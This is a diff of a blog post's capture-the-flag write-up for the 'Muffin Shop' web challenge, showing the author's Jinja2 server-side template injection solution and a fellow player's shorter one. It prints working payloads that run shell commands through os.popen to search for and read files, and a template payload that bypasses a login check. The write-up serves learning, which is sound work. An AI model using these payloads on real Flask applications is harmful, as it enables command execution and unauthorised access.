@@ -1,7 +1,7 @@
 ---
 title: CSD 2021 Muffin Shop Write-Up
 author: Andreas Wienes
-date: 2021-11-21 12:11:26 +0100
+date: 2021-11-20 18:11:26 +0100
 categories: [ctf][writeup]
 tags: 
   - "infosec"
@@ -12,7 +12,11 @@ toc: true
 
 In November 2021 I was part of a small team ('Tychologen') that took part in the Cyber Security Days 2021 thankfully organized by the Ostschweizer Fachhochschule.
 
-This is a short write-up for one of the the web security challenges called "Muffin Shop", which was rated as medium difficulty.
+This is a short write-up for one of the web security challenges called "Muffin Shop", which was rated with medium difficulty.
+
+I will publish two differnet solutions here. At first my own and then a shorter and smarter method by Lexiea, who also took part in the event.
+
+---
 
 ## Introduction
 
@@ -24,6 +28,7 @@ This is a short write-up for one of the the web security challenges called "Muff
 > Retrieve the flag from the template folder in a file creatively called 'flag.html'. 
 Good luck!
 
+## My Solution
 This is what we see when we visit the web application for the first time:
 
 ![muffin-welcome](/assets/img/muffin-welcome.png)
@@ -94,54 +99,52 @@ Then I've used
 ```
 as input for the username to search for all files that contain *flag* in it's name and afterwards cat the results out.
 
+![muffin-ssti-ls-cat](/assets/img/muffin-ssti-ls-cat.png)
 
+And got this as results
 
-![[Pasted image 20211120224417.png]]
+![muffin-ssti-ls-cat-output](/assets/img/muffin-ssti-ls-cat-output.png)
 
-![[Pasted image 20211120224430.png]]
+So finally the last step was to use
 
-![[Pasted image 20211120224447.png]]
-
-![[Pasted image 20211120224621.png]]
-
-![[Pasted image 20211120224550.png]]
-
-![[Pasted image 20211120224657.png]]
-
-![[Pasted image 20211120224747.png]]
-
-{{config.__class__.__init__.__globals__['os'].popen('la -al').read()}}
-
-
-
-![[Pasted image 20211120225143.png]]
-
-![[Pasted image 20211120225311.png]]
-
-{{config.__class__.__init__.__globals__['os'].popen('find / -name \\*flag\\* > find.txt && cat find.txt').read()}}
-
-![[Pasted image 20211120225838.png]]
-
-![[Pasted image 20211120225856.png]]
-
+```PYTHON
 {{config.__class__.__init__.__globals__['os'].popen('cat /app/templates/flag.html').read()}}
+```
 
-![[Pasted image 20211120225942.png]]
+to get the content of flag.html
 
-![[Pasted image 20211120230025.png]]
+![muffin-flag](/assets/img/muffin-flag.png)
 
-![[Pasted image 20211120230040.png]]
 
 ---
 
-# Shorter Way
+## Lexiea's Way
 
-![[Pasted image 20211120230740.png]]
+User Lexiea found another, way smarter solution and shared it after the official solution was provided.
 
-User lexiea
+![muffin-lexiea-solution](/assets/img/muffin-lexiea-solution.png)
 
+_Damn, that was smart._
+
+I tried this method on my own and entered 
+
+```PYTHON 
 {% set logged_in = true %}{% include 'flag.html' %}
+```
+And voilà we get the flag without using a lot of SSTI kung-fu.  
 
-![[Pasted image 20211120230510.png]]
+![muffin-lexieia-flag](/assets/img/muffin-lexieia-flag.png)
 
-![[Pasted image 20211120230548.png]]
+---
+
+## My Learnings
+
+- When XSS and SQLi don't work, try SSTI
+- It's super useful to understand how  ```@requires_login``` in Python Flask works
+- [book.hacktricks.xyz](https://book.hacktricks.xyz) is an awesome resource and always a look worth
+
+## Acknowledgments
+
+Thanks a lot to Ostschweizer Fachhochschule for organizing this CTF event. 
+
+Thanks to Lexia for sharing the smarter solution with us!
